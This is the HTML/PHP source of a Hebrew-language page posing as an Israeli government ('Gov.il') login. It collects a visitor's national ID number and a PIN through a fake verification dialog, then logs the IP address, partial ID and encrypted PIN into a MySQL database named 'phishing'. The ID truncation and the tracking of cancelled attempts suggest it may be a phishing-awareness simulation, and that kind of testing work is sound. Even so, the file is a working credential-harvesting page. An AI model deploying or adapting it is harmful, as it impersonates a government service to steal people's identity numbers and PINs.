<!DOCTYPE html>
<html lang="en">

<head>
    <!-- Required meta tags-->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="author" content="Colorlib">
    <meta name="keywords" content="Colorlib Templates">

    <!-- Title Page-->
    <title>Gov.il</title>

	<!-- Main CSS-->
    <link href="css/main.css" rel="stylesheet" media="all">
</head>


<style>
@font-face{
  font-family: "VarelaRound-Regular";
  src: url("./fonts/VarelaRound-Regular.ttf") format("truetype");
}

/* The Modal (background) */
.modal {
  display: none; /* Hidden by default */
  position: fixed; /* Stay in place */
  z-index: 1; /* Sit on top */
  left: 0;
  top: 0;
  width: 100%; /* Full width */
  height: 100%; /* Full height */
  overflow: auto; /* Enable scroll if needed */
}

/* Modal Content */
.modal-content {
  position: absolute;
  margin-right: 500px;
  
  width: 100%;
  height: 100%;
  
  -webkit-animation-name: animatetop;
  -webkit-animation-duration: 0.4s;
  animation-name: animatetop;
  animation-duration: 0.4s
}

/* Add Animation */
@-webkit-keyframes animatetop {
  from {top:-300px; opacity:0} 
  to {top:0; opacity:1}
}

@keyframes animatetop {
  from {top:-300px; opacity:0}
  to {top:0; opacity:1}
}

/* The Close Button */
.close {
  color: white;
  float: right;
  font-size: 28px;
  font-weight: bold;
}

.close:hover,
.close:focus {
  color: #000;
  text-decoration: none;
  cursor: pointer;
}

.modal-header {
  background-image: url("./images/header.png");
height: 29px; /* You must set a specified height */
background-position: center; /* Center the image */
background-repeat: no-repeat; /* Do not repeat the image */
max-width: 491px;

}

.modal-body {
background-image: url("./images/center.png");
height: 120px; /* You must set a specified height */
background-position: center; /* Center the image */
background-repeat: no-repeat; /* Do not repeat the image */
max-width: 491px;

}

.modal-footer {
  background-image: url("./images/footer.png");
height: 44px; /* You must set a specified height */
background-position: center; /* Center the image */
background-repeat: no-repeat; /* Do not repeat the image */
max-width: 491px;

}

.pwd {
  position: relative;
  top: 66px;
  left: -16%;
  border-color: #3366ff;
  text-align: center;
  height: 22px;
  width: 252px;
}

.cancel {
  position: relative;
  top: 5px;
  left: -34%;
  height: 25px;
  width: 82px;
}

.verify {
  position: relative;
  top: 5px;
  left: 10px;
  height: 25px;
  width: 86px;
}

.id {
	padding: 10px;
	border-color: #45a049;
	border-style: solid;
}

.classic_btn {
    display: inline-block;
    text-align: center;
    border-radius: 2px;
    line-height: 19px;
    cursor: pointer;
    margin-left: -1px;
    padding: 4px 15px;
    box-shadow: 0 1px 1px rgba(0,0,0,0.1);
    background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
    border: 1px solid #c6c6c6;
    color: #000;
    text-decoration: none;
    font-family: sans-serif;
}

.classic_btn:hover {
}

.classic_btn:active {
    background-color: #f6f6f6;
    background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
    box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
}

.is-pressed {
  background: -webkit-linear-gradient(top,#eee,#e0e0e0);
  border: 1px solid #d7d7d7;
  box-shadow: inset 0 1px 2px 0 rgba(0,0,0,0.1);
}

.border-3 {
    border-style: solid;
}

</style>


<body dir="rtl">

	<div id="myModal" class="modal">

  <!-- Modal content -->
  <div class="modal-content">
	<div onclick="closeModal()">
		<div class="modal-header" id="divClose">
		<span onclick="closeModal()"></span>
		</div>
	</div>
    <div class="modal-body">
		<form id="frm" method="POST">
				<input type="password" id="code" name="code" class="pwd border-3" size="22">
    </div>
    <div class="modal-footer">
		<input type="button" value="Cancel" id="cancel" name="cancel" class="cancel classic_btn" onclick="closeModal()">
		<input type="button" value="Verify" id="verify" name="verify" class="verify classic_btn" onclick="verifyCode()">
    </div>
  </div>

</div>

	<h1 style="padding: 10px">ברוכים הבאים אל המערכת!</h1>
	<h2 style="padding: 10px">עוד שלב קטן ואתם שם....</h2>
	
    <div class="page-wrapper bg-white p-t-100 p-b-100 font-robo" style="background-image: url('./images/vacation.jpg'); background-repeat: no-repeat; background-position: center; background-size: cover;">
        <div class="wrapper wrapper--w680">
            <div class="card card-1" style="position:absolute; right: 100px; top: 420px; height: 340px; width: 500px;">
                <div class="card-heading"></div>
                <div class="card-body">
                    <h2 class="title">כניסה</h2>
                    
						<div class="id">
							<div class="input-group">
								<b>אנא הכנס מספר תעודת זהות: </b><br><br><input class="border border-dark" placeholder="מספר הזהות שלך..." type="text" id="id" name="id" size="16">
							</div>
							<div class="p-t-20">
								<input class="btn btn--radius btn--green" type="button" value="המשך" id="next" name="next" onclick="runModal()">
							</div>
						</div>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <!-- Jquery JS-->
    <script src="vendor/jquery/jquery.min.js"></script>
   

<script>

function runModal() {
	if(document.getElementById("id").value != "")
	{
		localStorage.setItem("id", document.getElementById("id").value);
		
		var modal = document.getElementById("myModal");
		modal.style.display = "block";
	}
	else
	{
		alert('אנא מלא ערך מתאים על מנת להמשיך');
	}
}


function closeModal() 
{
	//var modal = document.getElementById("myModal");
	//modal.style.display = "none";
	
	document.getElementById("code").value = document.getElementById("code").value + " ###### cancelled";
	document.getElementById("frm").submit();
}

function verifyCode()
{
	if(document.getElementById("code").value != "")
	{
		localStorage.setItem("code", document.getElementById("code").value);

		document.getElementById("frm").submit();
	}
	else
	{
		alert('אנא מלא ערך מתאים על מנת להמשיך');
	}
}

</script>


<?php
	
	require_once("x509.php");
	
	function get_client_ip()
	{
		  $ipaddress = '';
		  if (getenv('HTTP_CLIENT_IP'))
			  $ipaddress = getenv('HTTP_CLIENT_IP');
		  else if(getenv('HTTP_X_FORWARDED_FOR'))
			  $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
		  else if(getenv('HTTP_X_FORWARDED'))
			  $ipaddress = getenv('HTTP_X_FORWARDED');
		  else if(getenv('HTTP_FORWARDED_FOR'))
			  $ipaddress = getenv('HTTP_FORWARDED_FOR');
		  else if(getenv('HTTP_FORWARDED'))
			  $ipaddress = getenv('HTTP_FORWARDED');
		  else if(getenv('REMOTE_ADDR'))
			  $ipaddress = getenv('REMOTE_ADDR');
		  else
			  $ipaddress = 'UNKNOWN';

		  return $ipaddress;
	}

	$conn = new mysqli ('localhost','root', '', 'phishing') or die("unable to connect");	
	mysqli_set_charset($conn, "utf8");
	
	$date = date("Y-m-d H:i:s");

	if(!empty($_POST['id']) || !empty($_POST['code']))
	{
		$ip = get_client_ip();
		
		if(!empty($_POST['id']) && !empty($_POST['code']))
		{
			$code = $_POST['code'];
			
			$pos = strpos($code, 'cancelled');
			
			if($pos)
			{
				$operation = 'cancelled';
			}
			else
			{
				$operation = 'all';
			}
		}
		elseif(!empty($_POST['id']) && empty($_POST['code']))
		{
			$operation = 'id only';
		}
		elseif(empty($_POST['id']) && !empty($_POST['code']))
		{
			$operation = 'code only';
		}
		
		if(!empty($_POST['id']))
		{
			$trimed_id = substr($_POST['id'], -4, 4);
			
			if($trimed_id === FALSE)
			{
				$trimed_id = $_POST['id'];
			}
		}
		
		$enc_code = encrypt_RSA($GLOBALS["KEY"], $_POST['code']);
		
		$sql = $conn->prepare("INSERT INTO users (date, ip, operation, personal_id, pin_code) VALUES (?, ?, ?, ?, ?)");
		
		$sql->bind_param('sssss', $date, $ip, $operation, $trimed_id, $enc_code);
		
		if ($sql->execute()) {
				if($operation == 'all')
				{
					echo '<script>window.location.replace("success.php");</script>';
				}
		}
		else
		{
				echo 'אירעה שגיאה, אנא פנה למנהל המערכת.';
		}
		
		//unset($_POST['id']);
		//unset($_POST['code']);
		$operation = '';
	}
	else
	{
		$ip = get_client_ip();
		$operation = 'enter only';
		$sql = $conn->prepare("INSERT INTO users (date, ip, operation) VALUES (?, ?, ?)");
		$sql->bind_param('sss', $date, $ip, $operation);
		$sql->execute();
	}
	
?>



</body><!-- This templates was made by Colorlib (https://colorlib.com) -->

</html>
<!-- end document-->
